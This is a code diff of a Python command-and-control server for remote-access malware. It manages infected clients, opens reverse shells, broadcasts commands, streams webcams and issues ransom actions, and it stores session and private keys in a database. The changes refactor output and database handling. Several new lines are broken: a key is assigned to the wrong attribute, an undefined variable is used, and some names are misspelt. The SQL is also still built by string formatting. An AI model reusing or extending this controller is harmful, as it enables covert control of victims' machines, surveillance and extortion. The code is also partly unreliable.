@@ -115,23 +115,10 @@ class Server(threading.Thread):
             try:
                 self.database.config(**self.config['database'])
                 self.database.connect()
-                print(colorama.Fore.GREEN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "Connected to database\n\n")
+                print(colorama.Fore.GREEN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "Connected to database")
             except:
                 max_v = max(map(len, self.config['database'].values())) + 2
-                print(colorama.Fore.RED + colorama.Style.BRIGHT + " [!] " + colorama.Fore.RESET + '''\
-Warning: unable to connect to the currently conifgured MySQL database
-        host: %s
-        port: %s
-        user: %s
-        password: %s
-        database: %s''' % (
-    ' ' * 4 + self.config['database'].get('host').rjust(max_v),
-    ' ' * 4 + self.config['database'].get('port').rjust(max_v),
-    ' ' * 4 + self.config['database'].get('user').rjust(max_v),
-    str('*' * len(self.config['database'].get('password'))).rjust(max_v),
-    self.config['database'].get('database').rjust(max_v)
-    )
-)
+                print(colorama.Fore.RED + colorama.Style.BRIGHT + " [!] " + colorama.Fore.RESET + "Warning: unable to connect to the currently conifgured MySQL database\n\thost: %s\n\tport: %s\n\tuser: %s\n\tpassword: %s\n\tdatabase: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('port').rjust(max_v),'\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v), '\x20' * 4 + str('*' * len(self.config['database'].get('password'))).rjust(max_v),'\x20' * 4 + self.config['database'].get('database').rjust(max_v)))
         self._client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self._request_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self._client_socket.bind(('0.0.0.0', port))
@@ -156,45 +143,16 @@ Warning: unable to connect to the currently conifgured MySQL database
             with self.lock:
                 print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Server Error: ' + data + '\n')
 
-    def _print(self, info=None, column1='command <arg>',column2='description'):
-        try:
-            info = json.loads(info)
-        except:
-            info = bytes(info)
-        if isinstance(info, dict):
-            max_key = max(map(len, info.keys() + [column1])) + 2
-            max_val = max(map(len, info.values() + [column2])) + 2
-            print('\n' + colorama.Fore.YELLOW + colorama.Style.DIM + column1.center(max_key) + column2.center(max_val))
+    def _print(self, info):
+        if info and len(info):
+            max_key = int(max(map(len, [i1 for i1 in info.keys() if i1 if i1 != 'None']))) if int(max(map(len, [i1 for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 40 else 40
+            max_val = int(max(map(len, [i2 for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [i2 for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 40 else 40
             for key in sorted(info):
-                print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
-        elif info != 'None':
-            print('\n' + self._text_color + self._text_style + info)
-        else:
-            pass
-        '''
-        try:
-            data     = json.loads(bytes(data))
-            max_len  = "{:<%d}" % int(max([len(i) for i in data.keys()]) + 2)
-            if data.get('command').encode() == 'prompt':
-                return
-        except: 
-            data = bytes(data).encode()
-            if 'prompt' in data:
-                return
-        print(self._text_color + self._text_style)
-        if self.current_client:
-            with self.current_client.lock:
-                try:
-                    print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
-                except:
-                    print("\n" + data)
-        else:
-            with self.lock:
-                try:
-                    print(json.dumps({max_len.format(k): v for k,v in data.items()}, indent=2))
-                except:
-                    print("\n" + data)
-            '''
+                if info.get(key) and info.get(key) != 'None':
+                    if len(info.get(key)) > 40:
+                        info[key] = info.get(key)[:37] + '...'
+                    info[key] = info.get(key).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
+                    print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
 
     def _return(self, data=None):
         if not self.current_client:
@@ -247,6 +205,23 @@ Warning: unable to connect to the currently conifgured MySQL database
             return ', '.join([i for i in data if i])
         except Exception as e:
             return "{} error: {}".format(self._get_status.func_name, str(e))
+
+    def _execute_sql(self, cursor, query):
+        try:
+            cursor.execute(query)
+            output = cursor.fetchall()
+            if output and len(output):
+                result = []
+                for row in output:
+                    row = row._asdict()
+                    for attr in [key for key,value in row.items() if key in ('last_update','completed','timestamp')]:
+                        if isinstance(value, datetime.datetime):
+                            row[key] = value.ctime()
+                    result.append(row)
+                return result
+        except Exception as e:
+            return "{} error: {}".format(self._execute_sql.func_name, str(e))
+            
 
     def _encrypt(self, data, key):
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
@@ -428,11 +403,29 @@ Warning: unable to connect to the currently conifgured MySQL database
         except Exception as e:
             return "Error: %s" % str(e)
 
+    def display(self, info):
+        print('\n')
+        if isinstance(info, dict):
+            if len(info):
+                self._print(info)
+        elif isinstance(info, list):
+            if len(info):
+                for data in info:
+                    self._print(data)
+        elif isinstance(info, str):
+            try:
+                self._print(json.loads(info))
+            except:
+                print(self._text_color + self._text_style + str(info))
+        else:
+            self._error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
+            
     def display_settings(self, args=None):
         if not args:
-            print("\n\n" + colorama.Fore.GREEN + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "Settings")
-            print(self._text_color + self._text_style + '\tdefault text color + style')
-            print(self._prompt_color + self._prompt_style + '\tdefault prompt color + style')
+            print("\n")
+            print(self._text_color + colorama.Style.BRIGHT + "Settings".center(40))
+            print(self._text_color + self._text_style + 'default text color + style'.center(40))
+            print(self._prompt_color + self._prompt_style + 'default prompt color + style'.center(40))
             print(self._text_color + self._text_style)
         else:
             target, _, options = args.partition(' ')
@@ -447,7 +440,7 @@ Warning: unable to connect to the currently conifgured MySQL database
                     print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt color changed to " + self._prompt_color + self._prompt_style + option)
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
-                        self._print("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
+                        self.display("usage: settings prompt style [value]\nstyles:   bright/normal/dim")
                     self._prompt_style = getattr(colorama.Style, option)
                     print(colorama.Fore.RESET + colorama.Style.BRIGHT + "prompt style changed to " + self._prompt_color + self._prompt_style + option)
                 else:
@@ -455,18 +448,20 @@ Warning: unable to connect to the currently conifgured MySQL database
             elif target == 'text':
                 if setting == 'color':
                     if not hasattr(colorama.Fore, option):
-                        self._print("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
+                        self.display("usage: settings text color [value]\ncolors:     white/black/red/yellow/green/cyan/magenta")
                     self._text_color = getattr(colorama.Fore, option)
                     print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text color changed to " + self._text_color + self._text_style + option)                    
                 elif setting == 'style':
                     if not hasattr(colorama.Style, option):
-                        self._print("usage: settings text style [value]\nstyles:     bright/normal/dim")
+                        self.display("usage: settings text style [value]\nstyles:     bright/normal/dim")
                     self._text_style = getattr(colorama.Style, option)
                     print(colorama.Fore.RESET + colorama.Style.BRIGHT + "text style changed to " + self._text_color + self._text_style + option)
                 else:
                     print("usage: settings text <option> [value]")
 
-    def show_usage_help(self, info=None, column1='command <arg>', column2='description'):
+    def show_usage_help(self, info=None):
+        column1 = 'command <arg>'
+        column2 ='description'
         info    = info if info else {"back": "background the current client", "client <id>": "interact with client via reverse shell", "clients": "list current clients", "exit": "exit the program but keep clients alive", "sendall <command>": "send a command to all connected clients", "settings <value> [options]": "list/change current display settings"}
         max_key = max(map(len, info.keys() + [column1])) + 2
         max_val = max(map(len, info.values() + [column2])) + 2
@@ -479,7 +474,6 @@ Warning: unable to connect to the currently conifgured MySQL database
             if not self.current_client:
                 self._error( "No client selected")
                 return
-            
             client = self.current_client
             result = ''
             mode, _, arg = args.partition(' ')
@@ -526,10 +520,9 @@ Warning: unable to connect to the currently conifgured MySQL database
                 self.send_client("webcam %s" % args, client.name)
                 task    = self.recv_client(client.name)
                 result  = task.get('result')
-            self._print(result)
+            self.display(result)
         except Exception as e:
             self._error("webcam stream failed with error: {}".format(str(e)))
-
 
     def ransom_client(self, args=None):
         if self.current_client:
@@ -541,7 +534,6 @@ Warning: unable to connect to the currently conifgured MySQL database
         else:
             self._error("No client selected")
 
-            
     def new_task_id(self, command, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
             client = self.clients[int(client_id)]
@@ -550,7 +542,7 @@ Warning: unable to connect to the currently conifgured MySQL database
         else:
             self._error("Invalid Client ID: {}".format(client_id))
         try:
-            return hashlib.new('md5', bytes(client.info['id']) + bytes(command) + bytes(time.time())).hexdigest()
+            return hashlib.new('md5', bytes(client.info['id']) + bytes(command) + bytes(int(time.time()))).hexdigest()
         except Exception as e:
             self._error("{} returned error: {}".format(self.new_task_id.func_name, str(e)))
 
@@ -571,42 +563,45 @@ Warning: unable to connect to the currently conifgured MySQL database
             if task:
                 cmd, _, __  = bytes(task.get('command')).partition(' ')
                 if cmd in self.config['tasks']:
-                    exists  = self.query_database("SELECT * FROM tbl_tasks WHERE task={}".format(task.get('task')), display=False)
+                    exists = self.database.callproc('sp_selectTasks', args=(task['client']))
                     if not exists:
-                        self.query_database("INSERT INTO tbl_tasks (task, client, session, command, result) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['task']), str(task['client']), str(task['session']), str(task['command']), str(task['result'])))), display=False)
-                    self._print("Database Updated")
+                        self.database.callproc('sp_addTask', args=(task['task'], task['client'], task['session'], task['command'], task['result']))
+                    self.display("Database Updated")
             else:
                 if self.current_client:
                     self.send_client('show results', self.current_client.name)
-                    output  = self.recv_client(self.current_client.name)
-                    results = json.loads(output.get('result'))
-                    for task in results:
-                        cmd, _, __  = bytes(task.get('command')).partition(' ')
-                        if cmd in self.config['tasks']:
-                            exists  = self.query_database("SELECT * FROM tbl_tasks WHERE task={}".format(task.get('task')), display=False)
-                            if not exists:
-                                self.query_database("INSERT INTO tbl_tasks (task, client, session, command, result) VALUES ({})".format(', '.join("'{}'".format(i) for i in (str(task['task']), str(task['client']), str(task['session']), str(task['command']), str(task['result'])))), display=False)
-                    self._print("Database updated")
+                    output = self.recv_client(self.current_client.name)
+                    client_results = json.loads(output.get('result'))
+                    self.database.callproc('sp_selectTasks', args=(task['client']))
+                    server_results = self.database.fetchall()._asdict()
+                    if client_results and server_results:
+                        new_tasks  = set(server_results.keys()).symmetric_difference(set(client_results.keys()))
+                        for task in [cmd for cmd in new_tasks if cmd.get('command').partition(' ')[0] in self.config['tasks']]:
+                            self.database.callproc('sp_addTask', args=(task.get('task'), task.get('client'), task.get('session'), task.get('command'), task.get('result')))
+                    self.display("Database updated")
         except Exception as e:
             self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
 
     def query_database(self, query, display=True):
-        result =  {}
         try:
-            cursor = self.database.cursor(dictionary=True)
-            cursor.execute(query)
-            result = cursor.fetchall()
-            if result:
-                result = {k: (v if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))) for r in result for k,v in r.items()}
-                self._print(json.dumps(result))
+            cursor = self.database.cursor(named_tuple=True)
+            result = self._execute_sql(cursor, query)
+            if display:
+                for row in result:
+                    self.display(json.dumps(row))
+            return result
         except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
+            self.database.reconnect()
             try:
-                self.database.reconnect()
-                return self.query_database(query, display)
-            except:pass
+                result = self._execute_sql(cursor, query)
+                if display:
+                    for row in result:
+                        self.display(json.dumps(row))
+                return result
+            except Exception as e:
+                return ["{} error: {}".format(self.query_database.func_name, str(e))]
         except Exception as e:
             self._error("{} error: {}".format(self.query_database.func_name, str(e)))
-        return result
 
     def connection_handler(self):
         while True:
@@ -617,8 +612,7 @@ Warning: unable to connect to the currently conifgured MySQL database
             self.clients[self.count] = client
             self.count  += 1
             client.start()
-            print(colorama.Fore.GREEN  + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection from %s:%s\n\n" % (client.address[0], client.address[1]))
-            self._print(json.dumps(client.info))
+            self.display(json.dumps(client.info))
             print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd() if not self.current_client else self.current_client.prompt % int(self.current_client.name)), end="")
 
     def request_handler(self):
@@ -696,8 +690,8 @@ Warning: unable to connect to the currently conifgured MySQL database
                         try:
                             output = subprocess.check_output(cmd_buffer, shell=True)
                         except: pass
-                    if output and len(str(output)):
-                        self._print(str(output))
+                    if output:
+                        self.display(output)
                 if self.exit_status:
                     break
             except KeyboardInterrupt:
@@ -710,7 +704,6 @@ class ClientHandler(threading.Thread):
 
     global threads
 
-    _recruited  = None
     _prompt     = None
 
     def __init__(self, connection, **kwargs):
@@ -718,16 +711,28 @@ class ClientHandler(threading.Thread):
         self.connection     = connection
         self.shell          = threading.Event()
         self.lock           = threading.Lock()
-        self.name           = kwargs.get('name')
-        self.address        = kwargs.get('address')
-        self.public_key     = kwargs.get('public_key')
-        self.private_key    = kwargs.get('private_key')
+        self.conifg         = self._config(**kwargs)
         self.session_key    = self._session_key()
         self.info           = self._info()
         self.session        = self._session()
         self.connection.setblocking(True)
 
-             
+    def _config(self, **kwargs):
+        for k,v in kwargs.items():
+            try:
+                if str(k) == 'name' and str(v).isdigit():
+                    self.name = v
+                elif str(k) == 'address' and socket.inet_aton(v[0]) and str(v[1]).isdigit():
+                    self.address = v
+                elif str(k) == 'public_key' and RSA.importKey(v):
+                    self.public_key = v
+                elif str(k) == 'private_key' and RSA.importKey(v):
+                    self.public_key = v
+                else:
+                    pass
+            except Exception as e:
+                self._error(str(e))
+
     def _error(self, data):
         with self.lock:
             print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.RESET + colorama.Style.DIM + 'Client {} Error: '.format(self.name) + bytes(data) + '\n')
@@ -743,19 +748,21 @@ class ClientHandler(threading.Thread):
         buf  = ''
         while '\n' not in buf:
             buf += self.connection.recv(1024)
-        try:
-            text  = threads['server']._decrypt(buf.rstrip(), self.session_key)
-            data  = json.loads(text.rstrip())
-            if data.get('id'):
-                exist = threads['server'].query_database("SELECT * FROM tbl_clients WHERE id='{}'".format(data.get('id')), display=False)
-                query = threads['server'].query_database("UPDATE tbl_clients SET {} WHERE id='{}'".format(data.get('id')), display=False) if exist else threads['server'].query_database("INSERT INTO tbl_clients ({}) VALUES ({})".format(', '.join(data.keys()), ', '.join(["'{}'".format(v) for v in data.values()])), display=False)
+        text  = threads['server']._decrypt(buf.rstrip(), self.session_key)
+        data  = json.loads(text.rstrip())
+        if data.get('id'):
+            exist = threads['server'].callproc('sp_selectclient', data.get('id'))
+            if exist:
+                print("\n\n" + colorama.Fore.GREEN  + colorama.Style.DIM + " [+] " + colorama.Fore.RESET + "Client {} has reconnected\n".format(self.name))
+                _ = threads['server'].callproc('sp_updateclient', data.get('id'))
+            else:
+                print("\n\n" + colorama.Fore.GREEN  + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "New connection - Client {}: \n".format(self.name))
+                self.display(json.dumps(exist))
+                _ = threads['server'].callproc('sp_addclient', data.values())
             for k,v in exist.items():
                 if not data.get(k) == v and not 'last_update' in k:
                     data[k] = v
-            return data
-        except Exception as e3:
-            self._error("{} returned error: {}".format(self._info.func_name, str(e3)))
-            self._kill()
+        return data
             
     def _session_key(self):
         try:
@@ -772,23 +779,19 @@ class ClientHandler(threading.Thread):
             self._kill()
 
     def _session(self):
-        try:
-            session_id  = hashlib.new('md5', str(self.info.get('id')) + str(int(time.time()))).hexdigest()
-            ciphertext  = threads['server']._encrypt(session_id, self.session_key)
-            self.connection.sendall(ciphertext + '\n')
-            execute     = threads['server'].query_database("INSERT INTO tbl_sessions ({}) VALUES ({})".format(', '.join(['id','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info.get('id'), self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
-            ciphertext  = ""
-            while "\n" not in ciphertext:
-                ciphertext += self.connection.recv(1024)
-            plaintext   = threads['server']._decrypt(ciphertext.rstrip(), self.session_key)
-            request     = json.loads(plaintext)
-            if request.get('request') == 'public_key':
-                response = threads['server']._encrypt(self.public_key.exportKey(), self.session_key)
-                self.connection.sendall(response + '\n')
-            return session_id
-        except Exception as e:
-            self._error("{} returned error: {}".format(self._session.func_name, str(e)))
-            self._kill()
+        session_id  = Crypto.Hash.MD5.new(json.dumps(self.info.get('id')) + str(int(time.time()))).hexdigest()
+        ciphertext  = threads['server']._encrypt(session_id, self.session_key)
+        self.connection.sendall(ciphertext + '\n')
+        execute     = threads['server'].query_database("INSERT INTO tbl_sessions ({}) VALUES ({})".format(', '.join(['id','client','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [session_id, self.info.get('id'), self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
+        ciphertext  = ""
+        while "\n" not in ciphertext:
+            ciphertext += self.connection.recv(1024)
+        plaintext   = threads['server']._decrypt(ciphertext.rstrip(), self.session_key)
+        request     = json.loads(plaintext)
+        if request.get('request') == 'public_key':
+            response = threads['server']._encrypt(self.public_key.exportKey(), self.session_key)
+            self.connection.sendall(response + '\n')
+        return session_id
 
     def prompt(self, data):
         with self.lock:
@@ -814,7 +817,7 @@ class ClientHandler(threading.Thread):
                         command = self.prompt(task.get('result') % int(self.name))
                         cmd, _, action  = command.partition(' ')
                         if cmd in ('\n', ' '):
-                            continue
+                            continue 
                         elif cmd in threads['server'].commands and cmd != 'help':
                             self._prompt = task
                             result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
@@ -848,6 +851,5 @@ if __name__ == '__main__':
     port = int(sys.argv[1]) if len(sys.argv) > 1 else 1337
     debug = True if 'debug' in sys.argv else (True if '--debug' in sys.argv else False)
     threads['server'] = Server(port=port, debug=debug)
-#    os.system('cls' if os.name is 'nt' else 'clear')
     threads['server'].start()
  
